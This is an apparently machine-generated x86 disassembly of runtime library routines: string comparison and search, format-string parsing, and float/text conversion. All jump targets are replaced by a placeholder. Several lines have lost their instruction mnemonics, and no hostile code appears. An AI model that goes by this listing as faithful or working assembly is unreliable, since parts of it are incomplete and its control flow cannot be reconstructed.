test ax ax
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop edi
pop esi
retn
add esi 0x2
add edi 0x2
inc ecx
cmp ecx [ esp ]
jb r-xdata
sub_43626c
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] ecx
mov esi eax
mov edi edx
xor ecx ecx
cmp ecx [ esp ]
jae r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
movzx eax [ esi ]
movzx edx [ edi ]
mov ebx eax
add ebx 0xffffff9f
sub bx 0x1a
jae r-xdata
mov ebx edx
add ebx 0xffffff9f
sub bx 0x1a
jae r-xdata
xor ax 0x20
cmp dx ax
jne r-xdata
xor dx 0x20
movzx eax ax
movzx edx dx
sub eax edx
mov [ esp + 0x4 ] eax
jmp r-xdata
test ax ax
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
add esi 0x2
add edi 0x2
inc ecx
cmp ecx [ esp ]
jb r-xdata
sub_4362f0
push esi
test dx dx
jne r-xdata
xor esi esi
jmp r-xdata
call sub_4360c4
mov esi eax
jmp r-xdata
movzx ecx [ eax ]
cmp dx cx
jne r-xdata
mov eax esi
pop esi
retn
test cx cx
je r-xdata
mov esi eax
add eax 0x2
jmp r-xdata
add eax 0x2
sub_436320
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor ax ax
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsw [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x2 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_436378
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edi ecx
sub edi [ ebp + 0x8 ]
test edi edi
jl r-xdata
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
add eax esi
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_436220
test eax eax
jne r-xdata
cmp [ esi + ebx * 2 ] 0x0
je r-xdata
mov eax ebx
add eax eax
add eax esi
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_436418
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4360a4
mov esi eax
inc esi
mov eax esi
call sub_4363ec
mov ecx esi
mov edx ebx
call sub_4360e0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_436454
push ebx
push esi
add esp 0xffffffb8
mov ebx ecx
mov esi eax
cmp ebx 0x1f
jbe r-xdata
mov eax esp
mov ecx ebx
call sub_4360e0
mov [ esp + ebx * 2 ] 0x0
mov eax esp
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] 0xa
lea edx [ esp + 0x40 ]
mov eax [ esi * 4 + rw-data ]
xor ecx ecx
call sub_434b8c
add esp 0x48
pop esi
pop ebx
retn
mov ebx 0x1f
sub_43649c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_4367ac
pop ebx
pop ebp
retn 0xc
sub_4364b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4360a4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4367ac
mov [ ebx + eax * 2 ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4364fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4360a4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4367ac
mov [ ebx + eax * 2 ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_436554
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4366da
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax 0xc00
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
mov [ ebp - 0x10 ] ebx
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x2010 ]
mov edx 0xfff
call sub_43649c
mov [ ebp - 0x10 ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea edx [ ebp - 0x2010 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_449e68
jmp r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov eax ebx
dec eax
cmp eax [ ebp - 0x10 ]
jle r-xdata
add ebx ebx
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_449d2c
mov eax [ ebp - 0x8 ]
mov edx ebx
call sub_449fd0
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_449fd0
jmp r-xdata
mov edi esi
test edi edi
je r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4366e1
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push edi
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_449db8
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
call sub_43649c
mov [ ebp - 0x10 ] eax
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
sub_4366ec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43675c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_449cc0
lea eax [ ebp - 0x4 ]
mov ecx ebx
mov edx edi
call sub_449ae8
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x8 ]
call sub_449db8
mov edx eax
mov ecx ebx
mov eax esi
call sub_436454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436763
lea eax [ ebp - 0x8 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_436790
push ebp
mov ebp esp
push ebx
movzx ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_436bf4
pop ebx
pop ebp
retn 0xc
sub_4367ac
push ebp
mov ebp esp
add esp 0xffffff58
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
lea ecx [ esi + ecx * 2 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
shr eax 0x1
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_436b70
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsw [ esi ]
cmp ax 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosw [ edi ]
dec edx
jne r-xdata
lodsw [ esi ]
cmp ax 0x25
je r-xdata
lea ebx [ esi - 0x4 ]
mov [ ebp - 0x14 ] ebx
call sub_43689a
cmp ax 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x1c ] ebx
mov ebx 0xffffffff
cmp ax 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsw [ esi ]
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] esi
push ecx
push edx
call sub_4368e9
pop edx
mov ebx [ ebp - 0x1c ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsw [ esi ]
jmp r-xdata
cmp [ ebp - 0x16 ] 0x2d
jne r-xdata
xor ebx ebx
lodsw [ esi ]
call sub_43689a
mov [ ebp - 0x16 ] ax
cmp ax 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov ax 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
pop ecx
mov esi [ ebp - 0x24 ]
jmp r-xdata
add ecx edx
xor edx edx
or edx edx
je r-xdata
sub_43689a
xor ebx ebx
cmp ax 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp ax 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp ax 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsw [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub ax 0x30
movzx eax ax
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
shr eax 0x1
jmp r-xdata
lodsw [ esi ]
jmp r-xdata
call sub_436b70
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4368e9
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_436b70
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x24 ]
sub ecx edx
shr ecx 0x1
mov ebx [ ebp - 0x4 ]
call sub_4366ec
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_436910 ]
mov ebx ecx
sub cl 0x44
je r-xdata
xor edx edx
xor eax eax
lea esi [ ebp - 0x66 ]
mov edx [ ebp - 0x20 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x86 ]
mov edx [ ebp - 0x20 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_449b0c
jmp r-xdata
mov esi sub_449b78
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
or cl cl
jne sub_4356bc
mov ecx 0x10
cmp bl 0x58
je r-xdata
sub cl 0x44
je r-xdata
xor edx edx
mov eax esi
mov ecx 0x1
jmp r-xdata
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
movzx ecx [ eax ]
inc eax
cmp cl 0x53
jne r-xdata
add esi [ ebp - 0x4 ]
mov edx eax
lea eax [ ebp - 0x10 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x10 ]
jmp r-xdata
mov esi eax
or esi esi
je r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor eax eax
mov ecx [ ebp - 0x20 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x86 ]
jmp r-xdata
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4356bc
mov ecx 0xa
cmp bl 0x55
je r-xdata
or cl cl
jne r-xdata
mov ecx 0x10
cmp bl 0x58
je r-xdata
mov esi sub_449ad8
jmp r-xdata
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_43676c
mov esi [ ebp - 0x10 ]
jmp r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
jmp r-xdata
mov ecx [ esi - 0x4 ]
shr ecx 0x1
mov ecx edi
sub ecx esi
shr ecx 0x1
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0xa6 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_436790
mov ecx eax
lea edx [ ebp - 0xa6 ]
lea eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
call sub_449ae8
mov esi [ ebp - 0x10 ]
or esi esi
je r-xdata
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4356bc
inc ecx
mov [ esi - 0x2 ] 0x2d
sub esi 0x2
add esp 0x8
retn
jmp r-xdata
push edx
push esi
or eax eax
jns sub_4355e4
mov ecx 0xa
cmp bl 0x55
je r-xdata
cmp ecx [ ebp - 0x20 ]
ja r-xdata
mov ecx [ ebp - 0x20 ]
retn
retn
dec edi
dec edi
mov ecx [ esi - 0x4 ]
shr ecx 0x1
retn
mov eax 0x12
mov edx [ ebp - 0x20 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
mov [ esi ] dx
or eax eax
jne r-xdata
add dx 0x7
neg eax
call sub_4355e4
mov ax 0x2d
mov [ esi - 0x2 ] ax
sub esi 0x2
inc ecx
retn
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
xor edx edx
div ecx
add dx 0x30
sub esi 0x2
cmp dx 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
shr ecx 0x1
sub edx ecx
jbe r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
retn
add ecx edx
sub esi edx
mov ax 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ esi + edx * 2 ] ax
mov [ esi ] ax
sub_436b90
push esi
xor esi esi
stosb [ edi ]
cmp bh 0x0
je r-xdata
or bl bl
jne r-xdata
xor al al
stosb [ edi ]
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
push ebx
mov ebx esp
sub ebx 0x8
push ebx
mov al ah
stosb [ edi ]
cmp bh 0x0
je r-xdata
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
xor al al
stosb [ edi ]
pop edx
pop ecx
cmp ebx edx
jne r-xdata
xor al al
stosb [ edi ]
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ch 0x0
je r-xdata
pop eax
pop esi
retn
sub_436bf4
push ebp
mov ebp esp
add esp 0xffffffd8
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xa ] ax
mov ax [ rw-data ]
mov [ ebp - 0xc ] ax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x26 ]
call sub_436ef4
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x26 ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x23 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_436cf4
shl ecx 0x1
lea esi [ ecx + ecx * 2 + r-xdata ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
mov ebx [ ebx ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
shr eax 0x1
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x26 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_436d01
call sub_436cf4
movsx ecx [ ebp - 0x26 ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov ax 0x30
[ edi ]
xor ah ah
stosw [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov ax 0x30
stosw [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
xor ah ah
shl eax 0x10
mov ax [ ebp - 0xa ]
stosd [ edi ]
mov ax [ ebp - 0xa ]
stosw [ edi ]
neg ecx
mov ax 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x23 ]
mov bh 0x1
movsx edx [ ebp - 0x26 ]
dec edx
call sub_436b90
retn
xor ecx ecx
xor ah ah
stosw [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_436d71
call sub_436cf4
call sub_436ce9
stosw [ edi ]
mov ax [ ebp - 0xa ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_436ce9
stosw [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x23 ]
mov bh 0x1
movsx edx [ ebp - 0x26 ]
dec edx
call sub_436b90
retn
xor ecx ecx
sub_436db3
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x26 ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov ax 0x30
stosw [ edi ]
jmp r-xdata
call sub_436ce9
stosw [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov ax [ ebp - 0xa ]
test ax ax
je r-xdata
mov ax [ ebp - 0xc ]
test ax ax
je r-xdata
jecxz r-xdata
stosw [ edi ]
stosw [ edi ]
mov bl 0x3
jmp r-xdata
call sub_436ce9
stosw [ edi ]
dec edx
jne r-xdata
mov ax 0x30
inc ecx
jne r-xdata
stosw [ edi ]
dec edx
je r-xdata
sub_436e26
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_436e7a
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_436db3
xor ah ah
stosw [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_436ef4
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_436f21
jmp r-xdata
call sub_437043
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_436f21
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_447c6c
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_437043
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_437120
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4371d7
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4371e2
neg edx
mov ecx esi
call sub_4371e2
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4371d7
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4371fe
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_447c6c
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4371e2
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4371fe
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_437234
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_437288
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
mov ecx 0x0
call sub_4495c0
mov eax [ ebp - 0x4 ]
call sub_449890
mov edx esi
mov ecx ebx
call sub_437120
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43728f
lea eax [ ebp - 0x4 ]
call sub_449348
retn
sub_437298
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x80 ]
xor ecx ecx
call sub_436bf4
mov ecx eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_449e68
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4372c8
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x80 ]
mov cl 0x1
call sub_436bf4
mov ecx eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_449e68
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4372f8
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_449db8
mov edx esp
xor ecx ecx
call sub_437234
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0x11
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_434b8c
sub_437350
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_449db8
mov edx esp
xor ecx ecx
call sub_437234
mov edx eax
